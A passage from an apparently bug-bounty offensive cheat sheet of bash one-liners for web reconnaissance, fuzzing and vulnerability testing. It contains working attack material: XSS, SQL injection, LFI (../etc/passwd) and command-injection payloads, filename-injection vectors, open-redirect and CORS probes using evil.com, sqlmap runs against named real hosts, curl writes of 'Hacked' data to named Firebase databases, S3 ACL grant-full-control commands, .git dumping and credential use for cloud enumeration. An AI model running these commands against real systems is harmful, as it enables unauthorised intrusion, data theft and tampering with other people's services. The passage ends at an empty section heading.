awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf5xx0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf5xx

# 3xx Hosts
cat httpx3xx | while read -r url; do echo "Results for $url" | tee -a ffuf3xx0; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -ac -recursion | uniffuf | tee -a ffuf3xx0; echo "--------------------------------------" | tee -a ffuf3xx0; done
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' ffuf3xx0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > ffuf3xx

# 3. FFUF Discovered Endpoints Across All Stripped Domains
while read -r domain; do while read -r ep; do url="https://$domain$ep"; echo "$url" | tee -a ffufEndpoints; ffuf -u "$url/FUZZ" -w ~/wordlists/mywordlist.txt -fs 0 -mc 200 -timeout 5 -ac | uniffuf | tee -a ffufEndpoints; echo "--------------------------------------" | tee -a ffufEndpoints; done < endpoints.txt; done < httpx-noproto

# Common Extension List for FFUF and Dirsearch:
# -e .7z,.7zip,.accdb,.backup,.bak,.cache,.class,.cfg,.conf,.config,.css,.crt,.csv,.csr,.db,.db3,.dbf,.doc,.docx,.ear,.js,.env,.gitignore,.dmg,.gz,.ini,.jar,.java,.json,.key,.log,.md,.md5,.mdb,.pdf,.pem,.pl,.plist,.pptx,.p12,.rpm,.py,.properties,.rar,.exe,.secret,.dll,.sh,.sql,.sqlcipher,.sqlitedb,.sqlite3,.action,.adr,.ascx,.asmx,.axd,.bkf,.iso,.bkp,.asc,.pub,.msi,.bok,.achee,.cfm,.cnf,.lst,.mai,.mbox,.mbx,.nsf,.ora,.pac,.passwd,.pcf,.pgp,.rdp,.reg,.rtf,.skr,.tpl,.url,.deb,.wml,.bat,.xsd,.tar,.bin,.tar.gz,.tgz,.txt,.war,.xls,.xlsx,.xml,.xz,.yaml,.yml,.swp,.tmp,.htm,.img,.lock,.aspx,.asp,.html,.inc,.php,.old,.jsp,.cgi,.jku,.jwk,.jks,.jwt
```

---

## 10. Comprehensive URL Gathering & Web Crawling

```bash
# 1. Multi-Tool Crawler & Archive Ingestion
otherURLS -i wildcards -o urls-others
cat httpx | gau --blacklist ico,svg,woff,ttf,list,png,jpg,gif >> urls-gau
katana -list httpx -o urls-katana -jc -dr -d 4 -em 7z,7zip,accdb,backup,bak,cache,class,cfg,conf,config,css,crt,csv,csr,db,db3,dbf,doc,docx,ear,js,env,gitignore,dmg,gz,ini,jar,java,json,key,log,md,md5,mdb,pdf,pem,pl,plist,pptx,p12,rpm,py,properties,rar,exe,secret,dll,sh,sql,sqlcipher,sqlitedb,sqlite3,action,adr,ascx,asmx,axd,bkf,iso,bkp,asc,pub,msi,bok,achee,cfm,cnf,lst,mai,mbox,mbx,nsf,ora,pac,passwd,pcf,pgp,rdp,reg,rtf,skr,tpl,url,deb,wml,bat,xsd,tar,bin,tar.gz,tgz,txt,war,xls,xlsx,xml,xz,yaml,yml,swp,tmp,htm,img,zip,lock,aspx,asp,html,inc,php,old,jsp,cgi,jku,jwk,jks,jwt
cat httpx | hakrawler 2>/dev/null | tee -a urls-hakrawler || true
waymore -n -i wildcards -oU urls-waymore -mode U

# GoSpider execution & parsing
gospider -S httpx -o urls-gospider --sitemap --robots -a --no-redirect -q --blacklist "\.(ico|svg|woff|ttf|list|png|jpg|gif)$" && cd urls-gospider && cat * >> urls-gospidy && mv urls-gospidy ../ && cd .. && rm -r urls-gospider && sed -i '/\[subdomains\] -/d; s/.*\(https\?:\/\/[^ ]*\).*/\1/' urls-gospidy

# ParamSpider & Waybackurls
while read -r domain; do paramspider -d "$domain"; done < httpx-noproto
paramspider -l httpx-noproto
cat httpx | waybackurls -no-subs | tee -a urls-wayback
waybackurls exampl.com >> urls.txt

# 2. Aggregation, Deduplication & Parameter Normalization
cat urls-* | anew | uro | tee -a urlss && grep -Ev '\.(png|jpeg|woff2|svg|css)(\?|$)' urlss > allurls && rm urlss && cat allurls | awk -F'[?&]' '{key=$1; for(i=2;i<=NF;i++){split($i,a,"="); key=key "&" a[1]}; if(!seen[key]++){print $0}}' | tee -a urls && mv urls-* allurls done/

# 3. Filter Foreign / Out-of-Scope Domains
awk -F/ 'NR==FNR{domains[$1]; next} {host=$3; sub(/:.*/,"",host); matched=0; for(d in domains) if(host==d || host ~ ("\\."d"$")) {matched=1; break} if(matched) print > "urls_allowed.txt"; else print > "urls_rejected.txt"}' wildcards urls && mv urls done/ && mv urls_allowed.txt urls

# 4. Sensitive Pattern Extraction
cat urls | grep "=eyJ" | sort -u >> eyJ
cat urls | grep -iE 'admin|internal|dashboard' > admin
grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' urls | sort -u > emails
```

---

## 11. JS Extraction, Endpoints & Parameter Mining

```bash
# 1. Partition URLs by Extension and Extract JS Files
mkdir -p extensions && cd extensions && cat ../urls | grep -Eo 'https?://[^ ]+\.(0|1|2|7z|7zip|accdb|action|adr|ar|arc|asc|ashx|asmx|asp|aspx|axaml|axd|bak|bak1|bakup|bakup1|backup|back|bat|bac|bck|bin|bk|bkp|bkf|bok|bowerrc|bz2|cache|cbz|cfm|cgi|class|clj|cnf|conf|config|copy|cookie|crt|cs|csproj|csr|csv|cvsignore|db|db3|dbf|deb|default|dmp|dof|doc|docx|docker-compose\.yml|dockerfile|dockerignore|ds_store|DS_Store|dmg|dump|ear|edn|enc|env|env\.local|env\.prod|env\.dev|env\.test|env\.example|env\.sample|env\.development|env\.production|env\.staging|env\.backup|env\.old|env\.save|env\.tmp|env\.temp|env\.log|env\.json|env\.yaml|env\.xml|env\.conf|env\.cfg|env\.settings|env\.secret|env\.keys|env\.credentials|env\.tokens|env\.api|env\.database|env\.mysql|env\.postgres|env\.redis|env\.mongo|env\.aws|env\.s3|env\.gcp|env\.azure|env\.docker|env\.k8s|env\.vault|eslintrc|eslintignore|exe|git|gitignore|gitconfig|gitmodules|gitattributes|gitkeep|gitlab-ci\.yml|gz|hcl|htaccess|htaccess\.bak|htaccess\.old|htaccess\.backup|htaccess\.save|htaccess\.tmp|htaccess\.temp|htaccess\.log|htaccess\.json|htaccess\.yaml|htaccess\.xml|htaccess\.conf|htaccess\.cfg|htaccess\.settings|htaccess\.secret|htdigest|htgroup|htpasswd|htpasswds|htdbm|html|htm|ica|idea|img|inc|include|ini|iso|jar|java|js|js\.map|jku|jwk|jks|jsp|json|jwt|key|k8s|lock|log|lst|lzma|mai|map|mbox|mbx|mdb|md|md5|msi|nsf|netrc|npmrc|nsx|old|ora|org|orig|original|pac|passwd|pcf|pem|pgp|php|plist|pl|pptx|ppk|prettierrc|prettierignore|properties|pub|py|rake|rar|rdp|reg|rpm|rtf|sav|save|saved|secret|sh|sls|spec|sql|sqlcipher|sqlitedb|sqlite3|sql\.gz|swp|swo|tar|tar\.7z|tar\.bz2|tar\.gz|tar\.lzma|tar\.xz|tgz|tfstate|tfvars|tmp|temp|tpl|toml|travis\.yml|tugboat|txt|url|vb|vscode|war|wim|wml|xls|xlsx|xml|xz|yaml|yml|yarnrc|zip)(\?|$)' | while read -r url; do ext="${url##*.}"; ext="${ext%%\?*}"; echo "$url" >> "$ext"; done && cat ../jsfiles.txt >> js && cat js | anew >> jss && rm js && mv jss js && cd .. && mv jsfiles.txt done/
cd extensions && for f in *; do [ -f "$f" ] && httpx -l "$f" -o "${f}-alive"; done && cd ..

# 2. Extract Endpoints & Parameters from Live JavaScript Files
total=$(wc -l < extensions/js-alive); i=0; while read -r url; do i=$((i+1)); content=$(curl -s "$url"); echo "$content" | grep -oE '/[a-zA-Z0-9_/\.-]+(\?[a-zA-Z0-9_=&%-]*)?' | sed 's/\?.*$//' | sed -E 's/\.[a-zA-Z0-9]+$//' | anew endpoints.txt >/dev/null; echo "$content" | grep -oE '/[a-zA-Z0-9_/\.-]+\?[a-zA-Z0-9_=&%-]+' | sed 's/.*?//' | tr '&' '\n' | cut -d= -f1 | anew parameters.txt >/dev/null; printf "\r[%d/%d] %d%%" "$i" "$total" "$((i*100/total))"; done < extensions/js-alive; echo

# 3. Extract Endpoints from URL Paths
awk -F/ '{p=""; for(i=4;i<NF;i++){p=p "/" $i} if(length(p)==0 && NF>3) p="/"; else if(length(p)>0 && substr(p,1,1)!="/") p="/" p; if(length(p)>0){gsub(/[:;%$&*()[\]{}]/,"",p); print p}}' urls | sed '/^$/d' | anew >> endpoints.txt

# 4. Extract Query Parameter Names
cat urls | grep '?' | sed 's/.*?//' | tr '&' '\n' | cut -d'=' -f1 | anew | tee -a params
cat extensions/js | while read url; do vars=$(curl -s "$url" | grep -Eo "var [a-zA-Z0-9_]+" | sed 's/^var //' | grep -v '.js' | grep -Ev '^[a-zA-Z]$'); [ -n "$vars" ] && echo "$vars" | tee -a params; done
cat ~/parameters.txt >> params && cat parameters.txt >> params
cat params | anew >> parameters && mv params done/ && mv parameters.txt done/

# 5. Clean Endpoints and Deparameterize URLs
sed 's/[?].*//' urls | tee -a deparameterized
sed -E 's/\/[^\/]+\.[a-zA-Z0-9]+$//' endpoints.txt | sed -E 's/([^\?&#]+)(\?.*|#.*)?/\1/' | sed 's:/$::' | grep -v '^$' | anew >> endpoints && mv endpoints.txt done/

# 6. FFUF Discovered Endpoints Across Alive Hosts
cat httpx | while read -r url; do echo "Results for $url" | tee -a finalendpoints0; ffuf -u "$url/FUZZ" -w endpoints -fs 0 -mc 200 -timeout 5 -ac | uniffuf | tee -a finalendpoints0; echo "--------------------------------------" | tee -a finalendpoints0; done && awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' finalendpoints0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > finalendpoints

# 7. Dynamic Scripts & Phase 1 URL Aggregation
grep -E '\.(php|asp|aspx|jsp|py|rb|pl|cgi|do|action|ashx)(\?|#|$)' urls | sed -E 's/([^\?&#]+)(\?.*|#.*)?/\1/' | httpx -silent | tee -a extendedUrls
cat extendedUrls httpx finalendpoints >> phase1

# 8. FFUF Parameter Fuzzing with Baseline Size Exclusion
while read url; do echo "=== Testing $url ==="; baseline=$(curl -s -o /dev/null -w "%{size_download}" "${url}?dummyparam=123"); echo "Results for $url" | tee -a phase2; ffuf -u "${url}?FUZZ=1" -w parameters -fs "$baseline" -timeout 5 -ac | uniffuf | tee -a phase2; echo "--------------------------------------" | tee -a phase2; done < phase1

# 9. Format Discovered Parameters into Query Strings
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(length(ep)>0) out=out ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' phase2 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "?" $0 "=1"}}' | anew >> parameterizedUrls

# 10. JavaScript Source Map Extraction (.js.map)
mkdir -p jsmap && cd jsmap && while read -r url; do name=$(basename "$url" .js.map); sourcemapper -output "$name" -url "$url"; done < ../extensions/js.map-alive
while read -r url; do name=$(basename "$url" .js); sourcemapper -output "$name" -jsurl "$url"; done < ../extensions/js-alive; cd ..
```

---

## 12. Vulnerability Testing & Scanning

### Prototype & Parameter Pollution
```bash
sed 's/$/?__proto%5Btestparam%5D=exploit/' httpx | page-fetch -j 'new URL(location).searchParams.get("__proto__[testparam]")==="exploit" ? "[VULNERABLE]" : "[NOTVULNERABLE]"' 2>/dev/null | grep '\[VULNERABLE\]' | tee -a parampollution
```

### Cross-Site Scripting (XSS)
```bash
# Blind XSS
bxsser parameterizedUrls

# AiriXSS fast reflection check
cat parameterizedUrls | grep "\?" | qsreplace '"><script>alert(1447)></script>' | airixss 'alert(1447)' | grep -v "Not" | tee -a xss

# Image tag reflection probing
cat allurls | grep "?" | qsreplace 'xssz\"><img/src=x onerror=confirm(999)><!--' | httpx -mr '\"><img/' | tee -a XSS
cat urls | grep "?" | qsreplace 'xssz\"><img/src=x onerror=confirm(999)><!--' | httpx -mr '\"><img/' | tee -a XSS

# Wayback & GAU piped reflection probes
echo "testphp.vulnweb.com" | waybackurls | grep "?" | qsreplace 'xssz\"><img/src=x onerror=confirm(999)><!--' | httpx -mr '\"><img/'
echo "testphp.vulnweb.com" | gau | grep "?" | qsreplace 'xssz\"><img/src=x onerror=confirm(999)><!--' | httpx -mr '\"><img/'

# GF pattern filtering + AiriXSS
cat domains | waybackurls | gf xss | tee -a gf-xss.txt
cat domains | gau | gf xss | tee -a gf-xss.txt
cat gf-xss.txt xss_urls.txt | qsreplace '"><script>alert(1447)></script>' | airixss 'alert(1447)' | grep -v "Not"

# Automated XSS scanners
xsscrapy.py -u http://example.com
python3 ~/tools/XSStrike/xsstrike.py -u "http://testphp.vulnweb.com/" --crawl -t 10
while IFS= read -r url; do python3 ~/tools/XSStrike/xsstrike.py -u "$url" --crawl -t 10 >> xsstrike.txt; done < urls
for x in $(cat httpx); do xsstrike -u $x --crawl -t 10 | tee -a xsstrike; done

# Dalfox automation & reflection scanning
sed 's/=.*/=/' params >> dalfox
cat dalfox | dalfox pipe --waf-evasion -o dalfox.txt
dalfox file urls.txt --skip-xss-scanning -o reflecting.txt
cat urls | dalfox pipe --skip-bav --skip-mining-all --skip-grepping -o dalfox

# KXSS parameter reflection probe
echo "https://www.target.com/event_register.php?event=177" | kxss
```

### SQL Injection (SQLi)
```bash
# FFUF Error-based SQLi regex scan
cat parameterizedUrls | while read -r url; do echo "Results for $url" | tee -a sqli; ffuf -u "${url%%=*}?${url#*=}=FUZZ" -w ~/sqlipayload -fs 0 -s "error\|syntax\|MySQL\|SQLSTATE\|ODBC\|PostgreSQL\|incorrect syntax\|Warning: mysql_fetch_array\|invalid query\|Fatal error\|error in your SQL syntax\|Query failed" -t 50 | tee -a sqli; echo "--------------------------------------" | tee -a sqli; done

# SQLMap testing across parameterized endpoints
cat allurls | grep "\?" | qsreplace "X" | tee -a sqli && sqlmap -m sqli --batch --random-agent --level=1 --risk=1 tamper=between,space2comment | tee -a sqli-output

# SQLMap request file & targeted attacks
sqlmap -u "https://portal.interworx.com/clientarea.php?id=*" --risk 3 --level 5 --random-agent --banner --batch --dbs --ignore-code 403 --tamper=space2comment.py,randomcase.py
sqlmap -r request.txt --batch --random-agent --tamper=space2comment,randomcase --drop-set-cookie --banner --threads 10 --dbs

# Ghauri SQLi testing
ghauri -u "https://ex.service.example.com/history?selectedSources=someSources" --dbms=postgres --cookie="JSESSIONID=09326D266052B6B0F7E391B7BBD3A284" --dbs
```

### Open Redirect
```bash
# qsreplace payload reflection
cat parameterizedUrls | qsreplace "https://evil.com" | httpx -fr -mr "evil.com" | tee -a openredirect

# Oralyzer testing
awk '{gsub(/https?:\/\//, ""); print}' httpx >> httpx-noproto
python3 ~/tools/Oralyzer/oralyzer.py -l httpx-noproto -p /root/tools/Oralyzer/payloads.txt | tee -a oralyzer-httpx-noproto.txt
grep -oP '(http|https)://\S+' oralyzer-httpx-noproto.txt > oralyzer.txt && rm oralyzer-httpx-noproto.txt
cat oralyzer.txt | httpx -o oralyzer-alive.txt
oralyzer -u example.com
```

### Local File Inclusion (LFI) & Traversal
```bash
# LFImap automated scan
lfimap -F parameterizedUrls -a | tee -a lfi-results0 && cat lfi-results0 | grep -E "\[\+\]" | tee -a lfi-results && rm lfi-results0
```

### Nuclei Scanning Workflows
```bash
nuclei -l httpx -tags swagger -rl 50 | tee -a nuclei-swagger
nuclei -l httpx -o nuclei-httpx -s low,medium,high,critical -rl 50
nuclei -l parameterizedUrls -dast -o nuclei-dast -s low,medium,high,critical -rl 50
nuclei -l ips -s medium,high,critical
```

### Known CVE Quick Probes
```bash
# Cisco ASA Directory Traversal (CVE-2020-3452)
while read LINE; do curl -s -k "$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[VULNERABLE] $LINE" | tee -a CVE-2020-3452; done < httpx

# Admin Modules XSS (CVE-2022-0378)
cat httpx | while read h; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x" | grep -qs "onmouse" && echo "$h: VULNERABLE" | tee -a CVE-2022-0378; done

# IIS Short Name Scanner
cat httpx-info | grep IIS | tee -a IIS && sed -i 's/ .*//' IIS && for url in $(cat IIS); do shortscan -F $url | tee -a IIS-scanned; done && mv IIS done/

# Grafana Exposure Scanner
grafana_scanner -u https://grafana.example.com
```

### Swagger & API Extraction
```bash
cat httpx | while read -r url; do echo "Results for $url" | tee -a swaggerjson0; ffuf -u "$url/FUZZ" -w ~/wordlists/swaggerjson -fs 0 -mc 200 -timeout 5 -ac | uniffuf | tee -a swaggerjson0; echo "--------------------------------------" | tee -a swaggerjson0; done && awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' swaggerjson0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > swaggerjson

# Parse Paths from Discovered Swagger JSONs
while read url; do echo "$url"; curl -s "$url" | jq -r '.paths | keys[]'; echo "----------------------------------------"; done < swaggerjson > swaggerjsonSecrets && mv swaggerjson swaggerjson0 done/

# Extract Sitemap Endpoints
while read domain; do echo "[+] Fetching sitemap for $domain"; curl -s "$domain/sitemap.xml" | xmllint --format - 2>/dev/null | grep -oP '(?<=<loc>).*?(?=</loc>)'; done < domains.txt
```

### Virtual Host (VHost) Fuzzing
```bash
ffuf -u 'https://example.com' -H 'Host: FUZZ.example.com' -w DNS/top-1million-11.txt
ffuf -u http://93.184.216.34 -H "Host: FUZZ.example.com" -w DNS/top-1million-11.txt
for domain in $(cat wildcards); do echo "***results for $domain " | tee -a vhosts; ffuf -u "https://$domain" -H "Host: FUZZ.$domain" -w ~/wordlists/best-dns-wordlist.txt -mc 200 -x socks5://127.0.0.1:9050 | tee -a vhosts; done
# Tip: If response sizes are identical (e.g. 4517), filter out with -fs 4517. Map valid VHosts in /etc/hosts (e.g. 138.68.165.164 redhat.ffuf.me).
```

### CIDR & Network Range Enumeration
```bash
# Fast Masscan Port Scanning on CIDR
masscan 1.2.3.4/24 -p 1-65535 --exclude 255.255.255.255 --rate 100000 --output-format json --output-filename scan-results.json

# Parse Masscan Output to IP:PORT
cat scan-results.json | sed -e '/^\[/d' -e '/^\]/d' -e 's/,$//' | jq -r '[.ip, .ports[0].port] | @tsv' | sed 's/\t/:/' | sort -u > masscan-cidr && rm scan-results.json

# Reverse IP to Hostname mapping
cat ips | hakip2host
crobat -r 2.3.4.5
dirsearch --cidr=CIDR --max-rate=2
```

### CORS Misconfiguration Testing
```bash
# Curl Origin Reflection Prober
cat urls | while read url; do resp=$(curl -s -I -H "Origin: https://evil.com" "$url"); echo "$resp" | grep -q "Access-Control-Allow-Origin: https://evil.com" && echo "$resp" | grep -q "Access-Control-Allow-Credentials: true" && echo "[CORS Vulnerable] $url" | tee -a cors.txt; done

# Automated CORS Scanners
python3 ~/tools/corsy/corsy.py -i httpx | tee -a corsy-httpx
python3 ~/tools/corsy/corsy.py -i urls | tee -a corsy-urls
python3 ~/tools/Corsy/corsy.py -u https://example.com
cors_scan.py -i urls/subdomains/domains
cors_scan.py -u example.com
```

### AWS S3 Buckets & Cloud Enumeration
```bash
# Extract S3 Buckets from CNAME/A Records
awk '{gsub(/https?:\/\//, ""); print}' httpx >> httpx-noproto
grep -E '^[a-zA-Z0-9.-]+$' httpx-noproto | awk 'length <= 253' | grep -v '^[0-9.-]' | while read domain; do echo "$domain"; done | dig -f - +short | grep -E '\.s3(-website)?[.-]' | tee -a s3

# Enumerate AWS IAM Credentials Found in JS
python3 tools/enumerate-iam-master/enumerate-iam.py

# S3 Bucket Scanners
s3scanner -bucket-file subdomains
s3scanner -bucket flaws.cloud
s3scanner -provider gcp -bucket my-bucket
s3enum -wordlist ~/wordlists/s3enumwordlist.txt -suffixlist ~/wordlists/s3enumsuffix.txt -threads 10 hackerone
ruby ~/tools/lazys3/lazys3.rb <COMPANY>
~/tools/cloud_enum/cloud_enum.py -k somecompany -k somecompany.io -k blockchaindoohickey

# CNAME check for S3
dig CNAME example.com # if returns xxx.s3.amazonaws.com

# AWS CLI S3 Permission Checks
aws s3 ls s3://flaws.cloud/ --no-sign-request
aws s3api get-object --bucket flaws.cloud --key robots.txt ./output --no-sign-request
aws s3 cp s3://flaws.cloud/robots.txt ./ --no-sign-request
aws s3 cp s3://docs-dev.baas.fuze.com/citadel/ ./citadel/ --recursive --no-sign-request
aws s3 cp randomfile.txt s3://flaws.cloud/robots.txt --no-sign-request
aws s3api get-bucket-acl --bucket flaws.cloud --no-sign-request
aws s3api put-bucket-acl --bucket {BUCKET_NAME} --grant-full-control emailaddress={EMAIL} --no-sign-request
aws s3api get-bucket-versioning --bucket flaws.cloud --no-sign-request
s3scanner dump -bucket flaws.cloud --dump-dir $(pwd)

# S3 Subdomain Takeover Bucket Creation
aws s3 mb s3://files-dev.target.com

# Cloud research reference: https://kaeferjaeger.gay/
```

### JavaScript Secret & Exposure Analysis
```bash
# Grep JS URLs & Probing
grep -i '\.js' allurls | sed -E 's/(\.js).*/\1/i' >> js.txt
cat js.txt | mantra | tee -a mantra
python3 ~/tools/LinkFinder/linkfinder.py -h
cat httpx | while read url; do python3 ~/tools/SecretFinder/secretfinder.py -i $url -e -g 'jquery;bootstrap;api.google.com' -o cli >> js-secretfinder; done
nuclei -l URLS/js.txt -t ~/nuclei-templates/http/exposures/ -mhe 4 | tee -a nuclei-js
cat URLS/js.txt | jsluice urls | tee -a jsluice-urls
cat URLS/js.txt | jsluice secrets | tee -a jsluice-secrets

# JS Download & Static Grep
getjs -url https://destroy.ai
curl https://destroy.ai | getjs
while IFS= read -r link; do wget "$link"; done < ../URLS/js200.txt
jsluice urls player.js
jsluice secrets player.js

# Hardcoded Secret Regex Pattern Search
grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret" /path/to/directory/*.js
```

### PHP Endpoint Fuzzing & Exploitation
```bash
# Arjun parameter discovery on PHP URLs
grep -i '\.php' allurls | sed -E 's/(\.php).*/\1/i' >> php.txt && while read url; do arjun -u "$url" -oT "$(echo $url | sed 's|https\?://||;s|/|_|g').txt" -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0" -o "$(echo $url | sed 's|https\?://||;s|/|_|g')_params.json"; done < php.txt

# Verification test patterns:
# SQLi: https://example.com/file.php?id=1' or sleep(100);-- -
# XSS: https://example.com/file.php?action=<svg/onload=confirm()>
# SSTI: https://example.com/file.php?action={{5*5}}
# LFI: https://example.com/file.php?filename=../../../../etc/passwd
# Command Injection: https://example.com/file.php?filename=file.txt;whoami
```

### HTTP Request Smuggling
```bash
cat httpx | python3 ~/tools/smuggler/smuggler.py | tee -a smuggler
```

### Origin IP Discovery & Cloudflare Bypass
```bash
# Method 1: Cloakquest3r
python3 cloakquest3r.py www.pepsico.com

# Method 2: Shodan SSL Certificate Subject CN Search
# Search query: ssl.cert.subject.CN:"*.target.com" 200
# Search query: Ssl.cert.subject.CN:"target.com" 200

# Method 3: Favicon Hash Shodan Search
# 1. Obtain favicon: https://favicons.teamtailor-cdn.com/
# 2. Compute hash: https://favicon-hash.kmsec.uk/ -> Search Shodan for org/origin

# Method 4: Censys Search
while IFS= read -r domain; do censys search "$domain" | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr -d '\"' | tr -d ',' >> ips-origin; done < domains
censys search hackerone.com | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr -d \"\, | tee -a ips
cat ips.txt | httpx -dashboard

# Method 5: Cloudflair Tool
python3 -m venv venv && source ~/venv/bin/activate
export CENSYS_API_ID=YOUR_CENSYS_API_ID
export CENSYS_API_SECRET=YOUR_CENSYS_API_SECRET
cloudflair.py example.com
deactivate

# Additional Email Received Header Inspection:
# Open email from target -> Show Original -> Search "Received:" for Origin IP.
# If Origin IP does not render HTTP, scan all 65535 ports (TCP/UDP/SCTP).
```

### EXIF Metadata & Document Dorking
```bash
# Go-Dork Queries
go-dork -q "inurl:'...'"
go-dork -e bing -q ".php?id="
go-dork -q "intext:'jira'" -p 5
go-dork -q "org:'Target' http.favicon.hash:116323821"
go-dork -q "site:*.target.com filetype:pdf" -p 10 | grep .pdf | anew download.txt
xargs -n1 curl --remote-name < download.txt
exiftool <file>

# Metadata check workflow:
# 1. Visit target profile/upload page and upload image.
# 2. Right-click and download processed image.
# 3. Check for leftover EXIF GPS/camera data via exiftool or https://jimpl.com/
```

### Firebase Misconfiguration
```bash
# Test if Firebase DB is world-readable/writable (returns JSON or null):
curl -s "https://target-project-default-rtdb.firebaseio.com/.json"
curl -X POST "https://agua-e6f2c-default-rtdb.firebaseio.com/.json" -d '{"Hacked":"OhMyLulu"}' -H "Content-Type: application/json"
curl "https://veertly-aurora.firebaseio.com/poc1.json" -X PUT -d '{"attacker":"maliciousdata"}'

# APK Tool Extraction for Firebase Secrets:
java -jar ~/tools/apktool.jar d target.apk -o outputDIR
gedit outputDIR/res/values/strings.xml
cd ~/tools/firebaseExploiter && ./firebaseExploiter -exploit -file domains/subdomains
firebaseExploiter -url https://target-project.firebaseio.com -exploit
python3 fireExploit.py
```

### Miscellaneous Protocol Probing
```bash
# CRLF Injection Suite
crlfsuite -iT httpx | tee -a crlf-httpx

# SSRFmap Automation
cd ~/mytools/SSRFmap && ./ssrfmap.py -r req.txt -m readfiles -p "pdf_path"

# DNS Zone Transfer Testing
zoner.sh -d zonetransfer.me
zoner.sh -l file_of_domains

# Shodan Check Point SVN RCE Check
# Query: "Server: Check Point SVN" "X-UA-Compatible: IE=EmulateIE7"
./emulateIE7 173.225.247.212

# Censys JARM Fingerprint Analysis
censys config
# VirusTotal -> target.com -> Details -> Copy JARM Fingerprint -> Search on Censys

# Email DMARC & SPF Verification
nslookup -type=txt example.com
nslookup -type=txt _dmarc.example.com
./tools/DMARC-SPF-Checker/mailwatch.py
./tools/DMARC-SPF-Checker/python_email_sender.py

# Broken Link Hijacking (BLH)
while read -r domain; do python3 ~/tools/BrokenLinkHijacker/BLH.py "https://$domain" -d 3 -o; done < ../wildcards

# LDAP Anonymous Bind Scan (Port 389)
ldapsearch -x -H ldap://target-ip:389 -s base

# .DS_Store Exposure
python ds_store_exp.py http://www.example.com/.DS_Store

# User Enumeration via Sitemap & Loxs
./sitemap-user-enum
python3 mytools/loxs/loxs.py
sitemapper.py

# Exposed .git Dumper
git-dumper https://example.com/.git output/
./tools/GitTools/Dumper/gitdumper.sh https://domain.com/.git/ hack_data && cd hack_data && git log
GitHacker --url https://example.com/.git/ --folder git_output

# XSS-LOADER
cd XSS-LOADER && python3 payloader.py

# Google Cloud Service Account Enumeration
gcloud init
gcloud auth activate-service-account --key-file=key.json
gcloud projects list
gcloud compute instances list
gsutil ls
gsutil cp gs://target-prod-logs/internal-access.log .
```

---

## 13. Filename Injection Vectors

Test these filename patterns inside file upload forms:

```text
Path Traversal:       ../../../tmp/shell.png
SQL Injection:        sleep(10)--.jpg
XSS Injection:        <svg onload=alert(document.domain)>.png
Command Injection:    ; sleep 10;.jpg
Denial of Service:    <extremely_long_string_10000_chars>.png
```

---

## 14. Manual Testing Tips & Business Logic Bypass Matrix

